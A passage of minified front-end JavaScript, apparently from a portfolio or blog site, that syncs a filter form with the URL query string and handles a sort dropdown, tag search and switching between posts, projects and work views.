URLSearchParams,e=r.getAll("tags");e.length>0&&i.set("tags",e.join(",")),r.forEach((c,t)=>{t==="tags"||!c||i.append(t,c.toString())}),history.pushState(null,"",`?${i.toString()}`),window.dispatchEvent(new Event("urlchange"))}function o(){const r=new URLSearchParams(window.location.search);r.forEach((e,c)=>{const t=s.elements.namedItem(c);(t instanceof HTMLInputElement||t instanceof HTMLSelectElement)&&(t.value=e)});const i=r.get("tags")?.split(",")||[];s.querySelectorAll('input[name="tags"]').forEach(e=>{e.checked=i.includes(e.value)})}s.addEventListener("input",n),window.addEventListener("popstate",o),o()}function p(){const n=document.querySelector(".sort-select-wrapper");if(!n)return;const o=n.querySelector('input[name="sort"]'),r=n.querySelector(".dropdown-container"),i=n.querySelectorAll(".sort-option-item");!o||!r||i.forEach(e=>{e.addEventListener("click",()=>{const c=e.dataset.value;i.forEach(t=>{t.classList.remove("active-selection")}),c&&(e.classList.add("active-selection"),o.value=c,o.dispatchEvent(new Event("input",{bubbles:!0})),r.classList.remove("dropdown-active"))})})}function h(){const n=document.querySelector(".tag-filter-container");if(!n)return;const o=n.querySelector(".tag-search-input"),r=n.querySelector(".tag-list-dropdown");if(!o||!r)return;function i(){const c=o.value.toLowerCase();r.querySelectorAll(".tag-item").forEach(t=>{const a=t.querySelector("input")?.value?.toLowerCase()||"",l=c===""||a.includes(c);t.style.display=l?"flex":"none"})}function e(){const c=Array.from(r.querySelectorAll(".tag-item"));c.sort((t,a)=>{const l=t.querySelector('input[type="checkbox"]'),u=a.querySelector('input[type="checkbox"]');return Number(u.checked)-Number(l.checked)}),c.forEach(t=>r.appendChild(t))}o.addEventListener("input",i),s.addEventListener("input",e),i(),e()}function m(){const n=document.getElementById("view-toggle-links"),o=document.getElementById("h1-title");if(!n)return;function r(e){o&&(e.startsWith("/posts")?o.textContent="All Posts":e.startsWith("/projects")?o.textContent="All Projects":e.startsWith("/work")&&(o.textContent="All Work"))}Array.from(n.children).forEach(e=>{e instanceof HTMLAnchorElement&&e.addEventListener("click",c=>{c.preventDefault(),n.querySelectorAll("a").forEach(u=>u.classList.remove("active-view")),e.classList.add("active-view");const t=new URL(e.href).pathname,a=new URLSearchParams(window.location.search).toString(),l=a?`${t}?${a}`:t;history.pushState(null,"",l),r(t),window.dispatchEvent(new Event("urlchange"))})})}}document.addEventListener("DOMContentLoaded",g);</script> <script lang="ts"></script> 